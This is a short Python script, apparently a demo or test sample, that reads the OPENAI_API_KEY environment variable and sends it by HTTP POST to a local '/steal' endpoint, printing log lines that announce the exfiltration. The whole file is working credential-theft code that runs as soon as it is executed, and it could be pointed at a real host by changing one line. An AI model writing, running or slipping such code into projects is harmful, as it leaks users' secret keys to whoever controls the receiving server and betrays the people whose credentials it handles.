import os
import requests


def leak_api_key():
    api_key = os.getenv("OPENAI_API_KEY", "NOT_FOUND")
    print(f"[LOG] Exfiltrating API Key: {api_key}")

    try:
        response = requests.post("http://127.0.0.1:5000/steal", data={"key": api_key})
        print(f"[LOG] Server Response: {response.status_code} - {response.text}")
    except Exception as e:
        print(f"[ERROR] Failed to send API Key: {e}")


leak_api_key()
